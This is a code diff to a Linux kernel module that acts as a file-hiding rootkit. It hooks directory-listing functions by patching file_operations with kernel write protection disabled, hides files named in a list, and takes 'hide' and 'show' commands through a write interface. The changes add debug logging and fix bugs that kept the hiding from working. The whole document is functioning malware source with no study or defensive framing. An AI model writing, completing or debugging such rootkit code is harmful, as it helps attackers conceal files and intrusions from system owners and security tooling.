@@ -140,9 +140,11 @@ static struct file_entry*  find_file_entry(const char *name, struct list_head* h
 
 static struct vfs_fops*  find_vfs_fops(struct file_operations* fops, struct list_head* head){
 	struct vfs_fops* i;
+	printk(KERN_INFO"find_vfs_fops for %p ", fops);
 	list_for_each_entry(i, head,list){
-
+		printk(KERN_INFO"entry %p , fops %p", i,i->fops);
 		if( i->fops == fops){
+			printk(KERN_INFO"find_vfs_fops returning");
 			return i;
 		}
 
@@ -173,6 +175,7 @@ static  struct vfs_fops* create_vfs_fops_entry(struct file_operations* fops
 	}
 
 	tmp ->readdir = fops->readdir;
+	tmp->fops = fops;
 
 	disable_wp();
 		fops->readdir = new_readdir;
@@ -250,11 +253,13 @@ static void clear_hooked_dirs(void){
 
 static int file_filldir_hider(void* buf, const char *name, int namelen, loff_t offset, u64 ino , unsigned d_type){
 	
+	printk(KERN_INFO"file hider filldir");
 	if(find_file_entry(name, banned_files) !=NULL){
+		printk(KERN_INFO"hiding %s", name);
 		return 0;
 	}
-
-	return kernel_filldir(buf,name,namelen,offset,ino, d_type);
+	printk(KERN_INFO"showing %s", name);
+	return file_kernel_filldir(buf,name,namelen,offset,ino, d_type);
 }
 
 static int file_hider(struct file* fp, void* d, filldir_t filldir){
@@ -270,22 +275,23 @@ static int file_hider(struct file* fp, void* d, filldir_t filldir){
 		printk(KERN_INFO"%s error retrieving dir name inc mess", MODULE_NAME);
 		return -ENOTDIR;
 	}
-
+	printk(KERN_INFO"file hider called for %s", magic);
 
 	hd = find_hooked_dir_entry(magic, &hooked_dir_list);
 	
 	if(hd == NULL){
+		printk(KERN_INFO"hi there");
 		vf = find_vfs_fops((struct file_operations*)fp->f_op, &vfs_fops_list);
-		printk(KERN_INFO"%s hitting supersmart linux kernel", MODULE_NAME);
+		printk(KERN_INFO"%s hitting supersmart linux kernel calling %p", MODULE_NAME,vf->readdir);
 		return vf->readdir(fp,d,filldir);
 	}
-
+	printk(KERN_INFO"directory covered");
 	mutex_lock(&filldir_mutex);	
 	file_kernel_filldir = filldir;
 	banned_files = &hd -> hidden_files_list;
 	ret =  hd->readdir(fp, d, file_filldir_hider);
 	mutex_unlock(&filldir_mutex);
-
+	printk(KERN_INFO"end of readdir");
 	return ret;
 }
 
@@ -385,16 +391,22 @@ static void hide_file(const char*dir, const char *name){
 	hd = find_hooked_dir_entry(dir,&hooked_dir_list);
 
 	if(hd == NULL){
-		hd = create_hooked_dir_entry(name,&hooked_dir_list);
+		printk(KERN_INFO"creating hook for %s", dir);
+		hd = create_hooked_dir_entry(dir,&hooked_dir_list);
 		if ( hd == NULL){
 			return;
 		}
 	}
-	fe = find_file_entry(name, &hd->hidden_files_list);
 
+	fe = find_file_entry(name, &hd->hidden_files_list);
+	printk(KERN_INFO"hiding file %s", name);
 	if(fe == NULL){
+		printk(KERN_INFO"not yet hidden");
 		fe = create_file_entry(name, &hd->hidden_files_list);
+		printk(KERN_INFO"hidden");
+
 		if(fe == NULL && list_empty(&hd->hidden_files_list)){
+			printk(KERN_INFO"failed, cleaning hooks");
 			delete_hooked_dir_entry(hd);
 		}
 	}
@@ -442,7 +454,7 @@ static int get_command(const char* input,char* cpybuf, char* cmd1, char* cmd2, u
 
 	strncpy(cpybuf, input, min((len+1),(unsigned long) INTERNAL_BUFFER_LEN));
 	cpybuf[min(len,(unsigned long ) INTERNAL_BUFFER_LEN)]=0;
-	return sscanf(cpybuf, "%s %s", command, param) == 2;
+	return sscanf(cpybuf, "%s %s", cmd1, cmd2) == 2;
 }
 
 
@@ -452,15 +464,20 @@ static int hide_file_write(struct file* file, const char __user * buf, unsigned 
 		return count;
 	}
 
+	printk(KERN_INFO"received %s %s", command,param);
 	if(!get_filendir(param,mydir, myfile)){
 		return count;
 	}	
 
+	printk(KERN_INFO"processing %s in %s", mydir,myfile);
+
 	if(!strcmp(command,hide)){
+		printk(KERN_INFO"hide");
 		hide_file(mydir,myfile);		
 	}
 
 	if(!strcmp(command,show)){
+		printk(KERN_INFO"show");
 		show_file(mydir,myfile);
 	}
 
